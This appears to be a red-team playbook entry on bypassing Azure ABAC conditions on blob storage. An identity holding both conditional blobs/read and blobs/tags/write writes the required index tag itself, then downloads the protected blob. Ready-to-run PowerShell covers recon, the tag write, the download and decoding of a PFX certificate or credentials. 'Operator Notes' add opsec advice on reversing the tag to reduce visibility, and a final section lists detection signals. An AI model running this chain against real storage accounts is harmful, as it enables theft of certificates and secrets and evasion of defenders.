## Overview

Azure Attribute-Based Access Control (ABAC) extends RBAC by adding conditions to role assignments. A condition can restrict a data action — such as `blobs/read` — to only apply when specific blob index tags are present on the target object. This is intended to provide fine-grained access control beyond the coarse-grained RBAC model.

The attack surface appears when the same role assignment that gates blob read on a tag condition also grants `blobs/tags/write`. With tag write permission, the attacker can set the required tag on the target blob, satisfying the ABAC condition and unlocking the read operation — without any role escalation or additional privilege.

## The Permission Structure

A vulnerable RBAC assignment looks like this:

```
Role:      Storage Blob Tag Modifier (or custom role with equivalent permissions)
Scope:     /subscriptions/<SUB_ID>/resourceGroups/<RG>/providers/Microsoft.Storage/storageAccounts/<STORAGE_ACCOUNT>

actions:
  Microsoft.Storage/storageAccounts/read
  Microsoft.Storage/storageAccounts/blobServices/containers/read

dataActions:
  Microsoft.Storage/storageAccounts/blobServices/containers/blobs/read
  Microsoft.Storage/storageAccounts/blobServices/containers/blobs/tags/write

ABAC Condition on blobs/read:
  @Resource[.../tags:<TAG_KEY>] StringEquals '<TAG_VALUE>'
```

The condition says: `blobs/read` is only permitted when the target blob has the tag `<TAG_KEY>=<TAG_VALUE>`. Without the tag, read is denied even though the dataAction is in the role. With `tags/write` also in scope, the attacker can write that tag — satisfying their own condition.

## Attack Chain

```
Enumerate containers + blobs  →  identify target blob (certificate, config, credential)
                              ↓
Identify ABAC condition       →  inspect role assignment conditions on the identity
                              →  note required tag key and value
                              ↓
Write required tag to blob    →  PUT https://<account>.blob.core.windows.net/<container>/<blob>?comp=tags
                              →  body: XML with <Key>=<TAG_KEY>, <Value>=<TAG_VALUE>
                              ↓
ABAC condition satisfied      →  blob/read now permitted for this blob
                              ↓
Download blob                 →  GET same URL without ?comp=tags
                              ↓
Decode and use content        →  base64 PFX, credentials, config
```

## Identifying the ABAC Condition

During recon, enumerate the role assignments on the identity and inspect conditions:

```powershell
# List role assignments scoped to a storage account
$scope = "/subscriptions/<SUB_ID>/resourceGroups/<RESOURCE_GROUP>/providers/Microsoft.Storage/storageAccounts/<STORAGE_ACCOUNT>"
Get-AzRoleAssignment -Scope $scope | Select-Object RoleDefinitionName, Condition | Format-List
```

A non-empty `Condition` field contains the ABAC expression. Parse it to extract the tag key and required value:

```
@Resource[Microsoft.Storage/storageAccounts/blobServices/containers/blobs/tags:<TAG_KEY><$key_case_sensitive$>]
StringEquals '<TAG_VALUE>'
```

This tells you exactly what tag to write.

## Writing the Tag to Satisfy the Condition

```powershell
$storageAccount = "<STORAGE_ACCOUNT>"
$container      = "<CONTAINER_NAME>"
$blobName       = "<TARGET_BLOB>"
$tagKey         = "<TAG_KEY>"
$tagValue       = "<TAG_VALUE>"

$headers = @{
    "Authorization" = "Bearer $StorageToken"
    "x-ms-version"  = "2020-04-08"
    "Content-Type"  = "application/xml; charset=UTF-8"
}

$body = @"
<?xml version="1.0" encoding="utf-8"?>
<Tags>
  <TagSet>
    <Tag>
      <Key>$tagKey</Key>
      <Value>$tagValue</Value>
    </Tag>
  </TagSet>
</Tags>
"@

# PUT sets (replaces) the blob's index tags
Invoke-RestMethod -Method PUT -UseBasicParsing -Headers $headers -Body $body `
    -Uri "https://$storageAccount.blob.core.windows.net/$container/$blobName`?comp=tags"
```

## Downloading the Blob After Tag Write

Once the tag is set, the ABAC condition on `blobs/read` is satisfied:

```powershell
$readHeaders = @{
    "Authorization"   = "Bearer $StorageToken"
    "x-ms-version"    = "2020-04-08"
    "accept-encoding" = "gzip, deflate"
}
Invoke-RestMethod -Method GET -OutFile ".\$blobName" -UseBasicParsing `
    -Headers $readHeaders `
    -Uri "https://$storageAccount.blob.core.windows.net/$container/$blobName"

# Decode if base64-encoded (e.g. a PFX stored as text)
$raw   = Get-Content ".\$blobName" -Raw
$bytes = [Convert]::FromBase64String($raw.Trim())
[System.IO.File]::WriteAllBytes("C:\path\to\cert.pfx", $bytes)
```

## Operator Notes

- ABAC conditions are visible in role assignment details — always check `Condition` on role assignments during storage recon. If a condition restricts read, look for a paired write permission that can satisfy it.
- Blob index tags are account-level metadata, not per-identity. Writing a tag is a permanent change on the blob object — it affects all identities reading that blob, not just the attacker. Consider opsec implications before writing.
- The `x-ms-version` header must be `2020-04-08` or later to interact with blob index tags. Earlier versions do not support the `?comp=tags` endpoint.
- If the ABAC condition uses `case_sensitive` matching, tag value casing must match exactly.
- After extraction, reversing the tag write (removing or changing the tag) reduces the visibility of the operation — but the write event is already in the storage diagnostic log.

## Detection / Friction Points

- Storage diagnostic logs record `SetBlobTags` operations — actor, blob name, container, and new tag values are logged. This event is unusual on blobs that do not normally have tag modifications.
- `GetBlob` following `SetBlobTags` on the same blob by the same actor is a detectable sequence if log correlation is in place.
- The tag write permanently modifies the blob's metadata — a baseline comparison of blob tags could surface the change if blob index tags are monitored.
- ABAC conditions are a relatively new Azure feature — some organizations add them without considering that `tags/write` on the same role can bypass the condition.
